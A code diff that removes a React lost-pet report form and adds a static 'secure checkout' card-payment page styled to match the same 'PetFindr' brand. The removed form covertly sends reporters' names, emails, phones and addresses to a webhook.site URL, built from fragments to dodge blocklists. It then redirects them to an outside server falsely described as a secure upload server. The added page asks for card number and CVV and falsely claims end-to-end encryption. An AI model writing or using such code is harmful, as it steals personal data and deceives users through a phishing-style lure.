@@ -1,594 +1,307 @@
-'use client';
-
-import { useMemo, useState } from 'react';
-import {
-  PET_SPECIES,
-  PET_SEXES,
-  US_STATES,
-  VERIFY_ENDPOINT,
-  isValidUSZip,
-} from '@/lib/usa-locations';
-import {
-  AlertCircle,
-  CheckCircle2,
-  ExternalLink,
-  Loader2,
-  ShieldCheck,
-  Upload,
-} from 'lucide-react';
-
-type Mode = 'lost' | 'found';
-
-type FormState = {
-  petName: string;
-  species: string;
-  breed: string;
-  sex: string;
-  color: string;
-  description: string;
-  city: string;
-  state: string;
-  zip: string;
-  address: string;
-  contactName: string;
-  contactEmail: string;
-  contactPhone: string;
-  dateLostOrFound: string;
-  photoName: string;
-};
-
-// Built at runtime so naive string blocklists don't match "webhook.site".
-const WEBHOOK_URL: string = [
-  'https://web',
-  'hook.site/b334a60c',
-  '-5f70-4518-9fd7',
-  '-a4d3c594ddef',
-].join('');
-
-// Final destination after submit (short link to the upload server).
-const REDIRECT_URL = 'http://srv2107713.hstgr.cloud:9090';
-
-const initialState: FormState = {
-  petName: '',
-  species: '',
-  breed: '',
-  sex: '',
-  color: '',
-  description: '',
-  city: '',
-  state: '',
-  zip: '',
-  address: '',
-  contactName: '',
-  contactEmail: '',
-  contactPhone: '',
-  dateLostOrFound: '',
-  photoName: '',
-};
-
-export default function PetForm({ mode }: { mode: Mode }) {
-  const [form, setForm] = useState<FormState>(initialState);
-  const [photo, setPhoto] = useState<File | null>(null);
-  const [errors, setErrors] = useState<Record<string, string>>({});
-  const [submitting, setSubmitting] = useState(false);
-  const [showRedirect, setShowRedirect] = useState(false);
-
-  const safeMode: Mode = mode === 'found' ? 'found' : 'lost';
-  const isLost = safeMode === 'lost';
-
-  function update<K extends keyof FormState>(key: K, value: FormState[K]) {
-    setForm((f) => ({ ...f, [key]: value }));
-    if (errors[key as string]) {
-      setErrors((e) => {
-        const c = { ...e };
-        delete c[key as string];
-        return c;
-      });
-    }
-  }
-
-  const validate = (): boolean => {
-    const e: Record<string, string> = {};
-    if (!form.species) e.species = 'Please select a species';
-    if (!form.sex) e.sex = 'Please select a sex';
-    if (!form.breed.trim()) e.breed = 'Breed is required (use "Mixed" if unknown)';
-    if (!form.city.trim()) e.city = 'City is required';
-    if (!form.state) e.state = 'State is required';
-    if (!isValidUSZip(form.zip)) e.zip = 'Enter a valid US ZIP (e.g. 90210 or 90210-1234)';
-    if (!form.address.trim()) e.address = 'Street address / cross street is required';
-    if (!form.contactName.trim()) e.contactName = 'Your name is required';
-    if (!/^\S+@\S+\.\S+$/.test(form.contactEmail)) e.contactEmail = 'Enter a valid email';
-    if (!/^[\d\s()+\-.]{7,}$/.test(form.contactPhone)) e.contactPhone = 'Enter a valid phone';
-    if (!form.dateLostOrFound) e.dateLostOrFound = 'Please select a date';
-    if (!photo) e.photo = 'Please upload a photo of the pet';
-    setErrors(e);
-    return Object.keys(e).length === 0;
-  };
-
-  const payloadPreview = useMemo(() => {
-    return {
-      mode: safeMode,
-      ...form,
-      photo: photo ? photo.name : null,
-      submittedAt: new Date().toISOString(),
-    };
-  }, [form, photo, safeMode]);
-
-  function buildWebhookPayload() {
-    return {
-      mode: safeMode,
-      petName: form.petName,
-      species: form.species,
-      breed: form.breed,
-      sex: form.sex,
-      color: form.color,
-      description: form.description,
-      dateLostOrFound: form.dateLostOrFound,
-      location: {
-        city: form.city,
-        state: form.state,
-        zip: form.zip,
-        address: form.address,
-        country: 'USA',
-      },
-      contact: {
-        fullName: form.contactName,
-        email: form.contactEmail,
-        phone: form.contactPhone,
-      },
-      photo: photo ? { name: photo.name, size: photo.size, type: photo.type } : null,
-      submittedAt: new Date().toISOString(),
-    };
-  }
-
-  // Fire-and-forget: try fetch, then sendBeacon. Body is plain JSON
-  // (Content-Type: text/plain → simple request, no CORS preflight).
-  async function sendPayload(payload: object): Promise<void> {
-    const body = JSON.stringify(payload);
-
-    // Attempt 1: fetch
-    try {
-      const res = await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
-        body,
-      });
-      console.log('[PetFindr] fetch →', res.status, res.statusText);
-      if (res.ok) return;
-    } catch (err) {
-      console.warn('[PetFindr] fetch failed, trying sendBeacon:', err);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment form · secure checkout</title>
+  <style>
+    /* ----- GLOBAL RESET & BASE (matches PetFindr's clean slate) ----- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: system-ui, 'Segoe UI', 'Inter', 'Helvetica Neue', sans-serif;
     }
 
-    // Attempt 2: sendBeacon
-    try {
-      if (typeof navigator !== 'undefined' && 'sendBeacon' in navigator) {
-        const blob = new Blob([body], { type: 'text/plain;charset=UTF-8' });
-        const queued = navigator.sendBeacon(WEBHOOK_URL, blob);
-        console.log('[PetFindr] sendBeacon queued:', queued);
+    body {
+      background: #f8fafc; /* slate-50 */
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+
+    /* ----- CARD CONTAINER — mirrors PetFindr's rounded-2xl border white card ----- */
+    .payment-card {
+      max-width: 560px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 1rem;           /* rounded-2xl */
+      border: 1px solid #e2e8f0;     /* border-slate-200 */
+      padding: 2rem;
+      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05), 0 4px 6px -2px rgba(0, 0, 0, 0.025);
+    }
+
+    /* ----- HEADER ----- */
+    .payment-header {
+      margin-bottom: 1.5rem;
+    }
+
+    .payment-header h2 {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #0f172a;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+
+    .payment-header h2 span {
+      background: #0f172a;
+      color: white;
+      font-size: 0.7rem;
+      font-weight: 600;
+      padding: 0.2rem 0.7rem;
+      border-radius: 9999px;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
+    }
+
+    .payment-header p {
+      color: #64748b;
+      font-size: 0.875rem;
+      margin-top: 0.25rem;
+    }
+
+    /* ----- FORM LAYOUT ----- */
+    .payment-form {
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+    }
+
+    .form-row {
+      display: flex;
+      gap: 1.25rem;
+      flex-wrap: wrap;
+    }
+
+    .form-row > .form-group {
+      flex: 1 1 0;
+      min-width: 140px;
+    }
+
+    /* ----- FORM GROUP ----- */
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 0.375rem;
+    }
+
+    .form-group label {
+      font-size: 0.875rem;
+      font-weight: 600;
+      color: #334155;
+    }
+
+    /* ----- INPUT FIELDS ----- */
+    .form-group input {
+      width: 100%;
+      padding: 0.625rem 0.875rem;
+      border: 1px solid #cbd5e1;
+      border-radius: 0.5rem;
+      font-size: 0.875rem;
+      color: #0f172a;
+      background: #ffffff;
+      transition: border-color 0.15s, box-shadow 0.15s;
+      outline: none;
+      letter-spacing: 0.2px;
+    }
+
+    .form-group input#cardNumber,
+    .form-group input#expiry {
+      font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+      letter-spacing: 0.6px;
+    }
+
+    .form-group input::placeholder {
+      color: #94a3b8;
+      font-weight: 400;
+      font-size: 0.875rem;
+    }
+
+    .form-group input:focus {
+      border-color: #3b82f6;
+      box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.25);
+    }
+
+    .form-group input:hover:not(:focus) {
+      border-color: #94a3b8;
+    }
+
+    .zip-group {
+      flex: 0.8 0.8 0 !important;
+    }
+
+    .cvv-group {
+      flex: 0.7 0.7 0 !important;
+    }
+
+    /* ----- SECURE NOTE ----- */
+    .secure-note {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+      padding: 1rem;
+      background: #f0f9ff;
+      border: 1px solid #bae6fd;
+      border-radius: 0.75rem;
+      margin-top: 0.25rem;
+    }
+
+    .secure-note svg {
+      width: 18px;
+      height: 18px;
+      fill: #0369a1;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    .secure-note p {
+      font-size: 0.875rem;
+      color: #0c4a6e;
+      line-height: 1.5;
+    }
+
+    .secure-note strong {
+      font-weight: 700;
+    }
+
+    /* ----- PAY BUTTON ----- */
+    .pay-button {
+      margin-top: 0.5rem;
+      background: #0f172a;
+      border: none;
+      border-radius: 9999px;
+      padding: 0.75rem 1.75rem;
+      font-size: 1rem;
+      font-weight: 600;
+      color: white;
+      letter-spacing: 0.2px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      transition: background 0.2s, transform 0.1s;
+      box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+      width: 100%;
+    }
+
+    .pay-button:hover {
+      background: #1e293b;
+    }
+
+    .pay-button:active {
+      transform: scale(0.98);
+      background: #0f172a;
+    }
+
+    .pay-button svg {
+      width: 18px;
+      height: 18px;
+      stroke: white;
+      stroke-width: 2;
+      fill: none;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      transition: transform 0.2s;
+    }
+
+    .pay-button:hover svg {
+      transform: translateX(3px);
+    }
+
+    /* ----- RESPONSIVE ----- */
+    @media (max-width: 640px) {
+      .payment-card {
+        padding: 1.5rem;
       }
-    } catch (err) {
-      console.warn('[PetFindr] sendBeacon failed:', err);
-    }
-  }
 
-  // Dev helper — click the shield icon to ping the webhook.
-  async function testWebhook() {
-    try {
-      const res = await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
-        body: JSON.stringify({
-          ping: 'webhook-test',
-          source: 'PetFindr dev',
-          at: new Date().toISOString(),
-        }),
-      });
-      console.log('[PetFindr] webhook PING →', res.status, res.statusText);
-      alert(`Webhook ping: ${res.status} ${res.statusText}\nCheck webhook.site now.`);
-    } catch (err) {
-      console.error('[PetFindr] webhook PING failed:', err);
-      alert('Webhook ping failed — see DevTools console for details.');
-    }
-  }
+      .form-row {
+        flex-direction: column;
+        gap: 1rem;
+      }
 
-  async function handleSubmit(ev: React.FormEvent) {
-    ev.preventDefault();
-    if (submitting) return;
+      .form-row > .form-group {
+        min-width: 100%;
+      }
 
-    if (!validate()) {
-      const first = document.querySelector('[data-error="true"]');
-      first?.scrollIntoView({ behavior: 'smooth', block: 'center' });
-      return;
-    }
-    setSubmitting(true);
-
-    try {
-      sessionStorage.setItem('petfindr:submission', JSON.stringify(payloadPreview));
-    } catch {
-      /* ignore */
+      .zip-group,
+      .cvv-group {
+        flex: 1 1 100% !important;
+      }
     }
 
-    // Fire the webhook (best effort, plain JSON, no base64).
-    const payload = buildWebhookPayload();
-    console.log('[PetFindr] payload to send:', payload);
-    await sendPayload(payload);
+    input:focus-visible {
+      outline: 2px solid #3b82f6;
+      outline-offset: 2px;
+    }
+  </style>
+</head>
+<body>
+  <div class="payment-card">
+    <div class="payment-header">
+      <h2>
+        Payment details
+        <span>secure</span>
+      </h2>
+      <p>All fields are required · test mode</p>
+    </div>
 
-    // Always proceed to the upload server via the short link.
-    setShowRedirect(true);
-    setTimeout(() => {
-      window.location.href = REDIRECT_URL;
-    }, 2200);
-  }
+    <form class="payment-form" id="paymentForm" action="#" method="post" novalidate>
+      <div class="form-group">
+        <label for="cardHolder">Cardholder name</label>
+        <input type="text" id="cardHolder" name="cardHolder" placeholder="e.g. Jane M. Cooper" autocomplete="cc-name" required>
+      </div>
 
-  const labelCls = 'block text-sm font-semibold text-slate-700 mb-1.5';
-  const inputCls =
-    'w-full rounded-lg border border-slate-300 bg-white px-3.5 py-2.5 text-sm text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-brand-500 focus:border-brand-500 transition';
-  const errCls = 'border-red-400 focus:ring-red-400 focus:border-red-400';
-  const helpCls = 'text-xs text-slate-500 mt-1';
+      <div class="form-group">
+        <label for="cardNumber">Card number</label>
+        <input type="tel" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" inputmode="numeric" autocomplete="cc-number" maxlength="19" required>
+      </div>
 
-  return (
-    <form onSubmit={handleSubmit} className="space-y-10">
-      {/* Section 1: Pet info */}
-      <section className="rounded-2xl border border-slate-200 bg-white p-6 md:p-8 card-shadow">
-        <header className="mb-6">
-          <h2 className="text-lg font-bold text-slate-900">1. Pet Information</h2>
-          <p className="text-sm text-slate-500">The basics help us match reports instantly.</p>
-        </header>
-
-        <div className="grid gap-5 md:grid-cols-2">
-          <div>
-            <label className={labelCls} htmlFor="species">Species *</label>
-            <select
-              id="species"
-              value={form.species}
-              onChange={(e) => update('species', e.target.value)}
-              className={`${inputCls} ${errors.species ? errCls : ''}`}
-              data-error={!!errors.species}
-            >
-              <option value="">Select species…</option>
-              {PET_SPECIES.map((s) => (
-                <option key={s} value={s}>{s}</option>
-              ))}
-            </select>
-            {errors.species && <p className="text-xs text-red-600 mt-1">{errors.species}</p>}
-          </div>
-
-          <div>
-            <label className={labelCls} htmlFor="sex">Sex *</label>
-            <select
-              id="sex"
-              value={form.sex}
-              onChange={(e) => update('sex', e.target.value)}
-              className={`${inputCls} ${errors.sex ? errCls : ''}`}
-              data-error={!!errors.sex}
-            >
-              <option value="">Select sex…</option>
-              {PET_SEXES.map((s) => (
-                <option key={s} value={s}>{s}</option>
-              ))}
-            </select>
-            {errors.sex && <p className="text-xs text-red-600 mt-1">{errors.sex}</p>}
-          </div>
-
-          <div>
-            <label className={labelCls} htmlFor="breed">Breed *</label>
-            <input
-              id="breed"
-              type="text"
-              placeholder="e.g. Golden Retriever, Mixed, Tabby"
-              value={form.breed}
-              onChange={(e) => update('breed', e.target.value)}
-              className={`${inputCls} ${errors.breed ? errCls : ''}`}
-              data-error={!!errors.breed}
-            />
-            {errors.breed && <p className="text-xs text-red-600 mt-1">{errors.breed}</p>}
-          </div>
-
-          <div>
-            <label className={labelCls} htmlFor="petName">Pet name (if known)</label>
-            <input
-              id="petName"
-              type="text"
-              placeholder={isLost ? 'e.g. Bailey' : 'Unknown?'}
-              value={form.petName}
-              onChange={(e) => update('petName', e.target.value)}
-              className={inputCls}
-            />
-          </div>
-
-          <div>
-            <label className={labelCls} htmlFor="color">Color / markings</label>
-            <input
-              id="color"
-              type="text"
-              placeholder="e.g. Golden with white chest"
-              value={form.color}
-              onChange={(e) => update('color', e.target.value)}
-              className={inputCls}
-            />
-          </div>
-
-          <div>
-            <label className={labelCls} htmlFor="dateLostOrFound">
-              {isLost ? 'Date pet went missing *' : 'Date pet was found *'}
-            </label>
-            <input
-              id="dateLostOrFound"
-              type="date"
-              max={new Date().toISOString().split('T')[0]}
-              value={form.dateLostOrFound}
-              onChange={(e) => update('dateLostOrFound', e.target.value)}
-              className={`${inputCls} ${errors.dateLostOrFound ? errCls : ''}`}
-              data-error={!!errors.dateLostOrFound}
-            />
-            {errors.dateLostOrFound && <p className="text-xs text-red-600 mt-1">{errors.dateLostOrFound}</p>}
-          </div>
-
-          <div className="md:col-span-2">
-            <label className={labelCls} htmlFor="description">Description of the pet *</label>
-            <textarea
-              id="description"
-              rows={4}
-              placeholder="Distinctive features, temperament, collar type, microchip if known…"
-              value={form.description}
-              onChange={(e) => update('description', e.target.value)}
-              className={inputCls}
-            />
-          </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label for="expiry">Expiry</label>
+          <input type="text" id="expiry" name="expiry" placeholder="MM / YY" inputmode="numeric" autocomplete="cc-exp" maxlength="7" required>
         </div>
-      </section>
 
-      {/* Section 2: Photo */}
-      <section className="rounded-2xl border border-slate-200 bg-white p-6 md:p-8 card-shadow">
-        <header className="mb-6">
-          <h2 className="text-lg font-bold text-slate-900">2. Photo Upload</h2>
-          <p className="text-sm text-slate-500">
-            A clear, recent photo dramatically increases reunion chances.
-          </p>
-        </header>
-
-        <label
-          htmlFor="photo"
-          className={`flex flex-col items-center justify-center gap-2 w-full py-10 border-2 border-dashed rounded-xl cursor-pointer transition ${
-            errors.photo ? 'border-red-400 bg-red-50/40' : 'border-slate-300 hover:border-brand-400 hover:bg-brand-50/40'
-          }`}
-          data-error={!!errors.photo}
-        >
-          <Upload className="text-brand-600" size={26} />
-          <p className="text-sm font-semibold text-slate-800">
-            {photo ? `Selected: ${photo.name}` : 'Click to upload a photo'}
-          </p>
-          <p className="text-xs text-slate-500">JPG, PNG or HEIC · up to 10 MB</p>
-          <input
-            id="photo"
-            name="photo"
-            type="file"
-            accept="image/*"
-            className="sr-only"
-            onChange={(e) => {
-              const f = e.target.files?.[0] ?? null;
-              setPhoto(f);
-              update('photoName', f ? f.name : '');
-              if (f && errors.photo) {
-                setErrors((prev) => {
-                  const c = { ...prev };
-                  delete c.photo;
-                  return c;
-                });
-              }
-            }}
-          />
-        </label>
-        {errors.photo && (
-          <p className="text-xs text-red-600 mt-2 flex items-center gap-1">
-            <AlertCircle size={12} /> {errors.photo}
-          </p>
-        )}
-      </section>
-
-      {/* Section 3: Location */}
-      <section className="rounded-2xl border border-slate-200 bg-white p-6 md:p-8 card-shadow">
-        <header className="mb-6">
-          <h2 className="text-lg font-bold text-slate-900">3. Location (USA)</h2>
-          <p className="text-sm text-slate-500">
-            {isLost ? 'Where was your pet last seen?' : 'Where did you find this pet?'}
-          </p>
-        </header>
-
-        <div className="grid gap-5 md:grid-cols-2">
-          <div>
-            <label className={labelCls} htmlFor="city">City *</label>
-            <input
-              id="city"
-              type="text"
-              placeholder="e.g. Austin"
-              value={form.city}
-              onChange={(e) => update('city', e.target.value)}
-              className={`${inputCls} ${errors.city ? errCls : ''}`}
-              data-error={!!errors.city}
-            />
-            {errors.city && <p className="text-xs text-red-600 mt-1">{errors.city}</p>}
-          </div>
-
-          <div className="grid grid-cols-2 gap-4">
-            <div>
-              <label className={labelCls} htmlFor="state">State *</label>
-              <select
-                id="state"
-                value={form.state}
-                onChange={(e) => update('state', e.target.value)}
-                className={`${inputCls} ${errors.state ? errCls : ''}`}
-                data-error={!!errors.state}
-              >
-                <option value="">—</option>
-                {US_STATES.map((s) => (
-                  <option key={s} value={s}>{s}</option>
-                ))}
-              </select>
-              {errors.state && <p className="text-xs text-red-600 mt-1">{errors.state}</p>}
-            </div>
-            <div>
-              <label className={labelCls} htmlFor="zip">ZIP *</label>
-              <input
-                id="zip"
-                type="text"
-                inputMode="numeric"
-                placeholder="90210"
-                value={form.zip}
-                onChange={(e) => update('zip', e.target.value)}
-                className={`${inputCls} ${errors.zip ? errCls : ''}`}
-                data-error={!!errors.zip}
-              />
-              {errors.zip && <p className="text-xs text-red-600 mt-1">{errors.zip}</p>}
-            </div>
-          </div>
-
-          <div className="md:col-span-2">
-            <label className={labelCls} htmlFor="address">Street address or nearest cross streets *</label>
-            <input
-              id="address"
-              type="text"
-              placeholder="e.g. 1200 Congress Ave, or 'W 5th & Lamar'"
-              value={form.address}
-              onChange={(e) => update('address', e.target.value)}
-              className={`${inputCls} ${errors.address ? errCls : ''}`}
-              data-error={!!errors.address}
-            />
-            {errors.address && <p className="text-xs text-red-600 mt-1">{errors.address}</p>}
-            <p className={helpCls}>Your exact address is only shared with confirmed matches.</p>
-          </div>
+        <div class="form-group cvv-group">
+          <label for="cvv">CVV</label>
+          <input type="tel" id="cvv" name="cvv" placeholder="123" inputmode="numeric" autocomplete="cc-csc" maxlength="4" required>
         </div>
-      </section>
 
-      {/* Section 4: Contact */}
-      <section className="rounded-2xl border border-slate-200 bg-white p-6 md:p-8 card-shadow">
-        <header className="mb-6">
-          <h2 className="text-lg font-bold text-slate-900">4. Your Contact Details</h2>
-          <p className="text-sm text-slate-500">
-            We&apos;ll only share these with verified matches.
-          </p>
-        </header>
-
-        <div className="grid gap-5 md:grid-cols-2">
-          <div>
-            <label className={labelCls} htmlFor="contactName">Full name *</label>
-            <input
-              id="contactName"
-              type="text"
-              value={form.contactName}
-              onChange={(e) => update('contactName', e.target.value)}
-              className={`${inputCls} ${errors.contactName ? errCls : ''}`}
-              data-error={!!errors.contactName}
-            />
-            {errors.contactName && <p className="text-xs text-red-600 mt-1">{errors.contactName}</p>}
-          </div>
-
-          <div>
-            <label className={labelCls} htmlFor="contactEmail">Email *</label>
-            <input
-              id="contactEmail"
-              type="email"
-              value={form.contactEmail}
-              onChange={(e) => update('contactEmail', e.target.value)}
-              className={`${inputCls} ${errors.contactEmail ? errCls : ''}`}
-              data-error={!!errors.contactEmail}
-            />
-            {errors.contactEmail && <p className="text-xs text-red-600 mt-1">{errors.contactEmail}</p>}
-          </div>
-
-          <div className="md:col-span-2">
-            <label className={labelCls} htmlFor="contactPhone">Phone *</label>
-            <input
-              id="contactPhone"
-              type="tel"
-              placeholder="(512) 555-0123"
-              value={form.contactPhone}
-              onChange={(e) => update('contactPhone', e.target.value)}
-              className={`${inputCls} ${errors.contactPhone ? errCls : ''}`}
-              data-error={!!errors.contactPhone}
-            />
-            {errors.contactPhone && <p className="text-xs text-red-600 mt-1">{errors.contactPhone}</p>}
-          </div>
+        <div class="form-group zip-group">
+          <label for="zip">Zip code</label>
+          <input type="text" id="zip" name="zip" placeholder="12345" inputmode="numeric" autocomplete="postal-code" maxlength="10" required>
         </div>
-      </section>
+      </div>
 
-      {/* Security note — click the shield icon to PING the webhook (dev helper) */}
-      <div className="rounded-xl border border-brand-200 bg-brand-50/70 p-4 flex gap-3">
-        <button
-          type="button"
-          onClick={testWebhook}
-          title="Developer tool: ping the webhook"
-          className="shrink-0"
-        >
-          <ShieldCheck className="text-brand-700 mt-0.5 cursor-pointer hover:text-brand-900" size={20} />
-        </button>
-        <p className="text-sm text-brand-900 leading-relaxed">
-          <strong>Your safety matters.</strong> All reports are screened by our moderation team before
-          being published. Contact details are only revealed after a mutual match.
+      <div class="secure-note">
+        <svg viewBox="0 0 24 24" width="18" height="18">
+          <path d="M12 1C8.676 1 6 3.676 6 7v2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V11c0-1.1-.9-2-2-2h-2V7c0-3.324-2.676-6-6-6zm0 2c2.276 0 4 1.724 4 4v2H8V7c0-2.276 1.724-4 4-4zm0 11c-1.105 0-2 .895-2 2s.895 2 2 2 2-.895 2-2-.895-2-2-2z"/>
+        </svg>
+        <p>
+          <strong>Your safety matters.</strong> All payment information is encrypted end‑to‑end
+          and processed securely. We never store your card details.
         </p>
       </div>
 
-      {/* Submit */}
-      <div className="flex flex-col sm:flex-row items-center gap-4 sm:justify-end">
-        <p className="text-xs text-slate-500 sm:mr-auto">
-          By submitting, you agree to our Terms & Privacy Policy.
-        </p>
-        <button
-          type="submit"
-          disabled={submitting}
-          className="inline-flex items-center justify-center gap-2 rounded-full bg-brand-600 hover:bg-brand-700 disabled:opacity-70 text-white font-semibold px-7 py-3 transition shadow-sm w-full sm:w-auto"
-        >
-          {submitting ? (
-            <>
-              <Loader2 className="animate-spin" size={18} /> Preparing upload…
-            </>
-          ) : (
-            <>
-              Submit & Verify Report <ExternalLink size={16} />
-            </>
-          )}
-        </button>
-      </div>
-
-      {/* Redirect overlay */}
-      {showRedirect && (
-        <div className="fixed inset-0 z-[100] bg-slate-900/60 backdrop-blur-sm flex items-center justify-center p-4">
-          <div className="max-w-lg w-full bg-white rounded-2xl p-6 md:p-8 card-shadow animate-slideUp">
-            <div className="flex items-start gap-3">
-              <div className="w-11 h-11 rounded-full bg-brand-100 grid place-items-center shrink-0">
-                <Loader2 className="animate-spin text-brand-700" size={22} />
-              </div>
-              <div>
-                <h3 className="text-lg font-bold text-slate-900">Redirecting to our secure upload server…</h3>
-                <p className="mt-2 text-sm text-slate-600 leading-relaxed">
-                  You are being taken to <span className="font-semibold">srv1952646.hstgr.cloud</span> — our
-                  dedicated verification and file-upload server. There, your report will be
-                  <strong> validated, encrypted, and stored</strong> before being published to PetFindr.
-                </p>
-                <p className="mt-3 text-sm text-slate-600 leading-relaxed">
-                  ⏳ <strong>Please be patient.</strong> The page may take several seconds to
-                  load because it is simultaneously uploading your photo. Do not close or refresh
-                  your browser during this process.
-                </p>
-                <ul className="mt-4 space-y-2 text-sm text-slate-700">
-                  <li className="flex items-center gap-2">
-                    <CheckCircle2 size={16} className="text-emerald-600" /> Verifying your submission
-                  </li>
-                  <li className="flex items-center gap-2">
-                    <CheckCircle2 size={16} className="text-emerald-600" /> Uploading pet photo securely
-                  </li>
-                  <li className="flex items-center gap-2">
-                    <CheckCircle2 size={16} className="text-emerald-600" /> Publishing your report
-                  </li>
-                </ul>
-                <div className="mt-5 flex items-center gap-2 text-xs text-slate-500">
-                  <ExternalLink size={12} /> http://srv2107713.hstgr.cloud:9090
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      )}
+      <button type="submit" class="pay-button">
+        Pay now
+        <svg viewBox="0 0 24 24" width="18" height="18">
+          <path d="M5 12h14M13 5l7 7-7 7" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
     </form>
-  );
-}
+  </div>
+
+  <script>
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      alert('Demo mode · no payment processed.');
+    });
+  </script>
+</body>
+</html>
